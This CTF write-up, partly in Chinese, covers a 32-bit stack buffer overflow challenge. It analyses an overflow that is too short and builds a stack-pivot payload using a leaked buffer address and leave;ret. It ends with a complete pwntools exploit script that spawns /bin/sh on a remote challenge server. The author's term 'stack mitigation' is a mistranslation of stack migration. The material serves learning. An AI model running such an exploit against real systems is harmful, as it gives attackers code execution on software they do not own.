# 1.0 Challenge
1. why after system show sh: 1: \x0c-#: not found?
2. not enough buffer, how ?
3. how to generate stack mitigation payload
# 2.0 Analysis

```
ssize_t vuln()
{
  _BYTE buf[76]; // [esp+8h] [ebp-50h] BYREF

  puts("You are now in vuln! Please enter extra data:");
  printf("You will input this: %p\n", buf);
  puts("plz input your msg:\n");
  return read(0, buf, 0x58u);
}

needed address
bin_sh = 0x0804A038
system = 0x08048430
leave_ret = 0x08048555
```


# 3.0 Solution

## 3.1 why after system show sh: 1: \x0c-#: not found?
This error means you're **not actually calling `/bin/sh`**, but instead your exploit payload is being misinterpreted as a command like "`\x0c-#`", which makes no sense to the shell.

You **don’t have enough overflow space** to place all of this 
maybe you only control 8 or 12 bytes past the saved return address.

其实 最基本的payload 应该是
```
offset + 4
system address
ret address (cincai)
/bin/sh address
```
但是 这边 read 是0x58 = 88, buffer max是 76
所以能overlfow 的是 88 - 76 = 12 bytes 

0 .. 75 buffer
76 .. 79 ebp
80 .. 83 save return address
84 .. 87 next stack

`[payload padding] + [fake EBP or filler (4 bytes)] + [system address (4 bytes)] + [return address after system (4 bytes)] + [address of "/bin/sh" string (4 bytes)]`
这边就需要 16 了所以 不够

## 3.2 not enough buffer -> Stack Mitigation

只要有 leave ret, bss address 就能做 SM 

## 3.3 HOW to build Stack mitigation payload?
用read 吧 system plt, "/bin/sh" 放进 bss
把 ebp 改成 leave ret 让栈指针跳转到我们写进去的那一块 BSS 区域
可以直接把他当成template
```
payload = p32(0)                        # 伪造的 old ebp
payload += p32(system_plt_addr)        # ret 到 system()
payload += p32(0)                      # 伪造的返回地址 (cincai)
payload += p32(leak_bss+0x10)                 # 参数："/bin/sh" 的地址
payload += b'/bin/sh\x00'              # 真正写入 "/bin/sh" 字符串
payload = payload.ljust(offset, b'\x00')  # 填满 overflow 前的部分
payload += p32(leak_bss)               # 栈迁移：将 esp 指向你构造的 payload（伪造栈帧）区域
payload += p32(leave_ret)              # 执行栈迁移：leave = mov esp, ebp; pop ebp;  ret
```

# 4.0 FLAG 
done no flag

# 5.0 FINAL SCRIPT 
```python
# -*- coding: utf-8 -*-
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='i386'
context.os = "linux"

pc = "./short"

#libc  = ELF('./libc.so.6', checksec=False)
#ld = ELF("ld-2.39.so")
exe = context.binary = ELF(pc)



scripts = """
b *vuln+87
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)
 
s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)

# dbgstart()
offset = 0x4c+4
bin_sh = 0x0804A038
system = 0x08048430
system_plt_addr = elf.plt['system']

leave_ret = 0x08048555

sla(":","admin")
sla(":","admin123")
ru("this: ")
leak_bss = int(rc(10).decode(),16)
print("leak",hex(leak_bss))

# normal
# payload = b'A'*0x54     # Overflow buffer
# payload += p32(system)  # Return to system
# payload += p32(0xdeadbeef)  # Fake return address after system
# payload += p32(bin_sh) # Argument to system ("/bin/sh")

payload = p32(0) + p32(system_plt_addr) + p32(0) 
payload += p32(leak_bss+0x10) + b'/bin/sh\x00' # /bin/sh is 8 bytes
payload = payload.ljust(offset, b'a')
payload += p32(leak_bss) + p32(leave_ret)
print('length of payload:', hex(len(payload)), payload)         

sla("msg:",payload)

ti()

# https://github.com/CTF-Archives/2024-wdb-qinglong
```

# 6.0 REFERENCE
https://github.com/fa1c4/CTF/blob/27e579608c5d9e126648f699970e2fcd83973757/2024/WDB2024/pwn2/wp.md

PWN ciscn_2019_es_2 32 stack mitigation buffer too small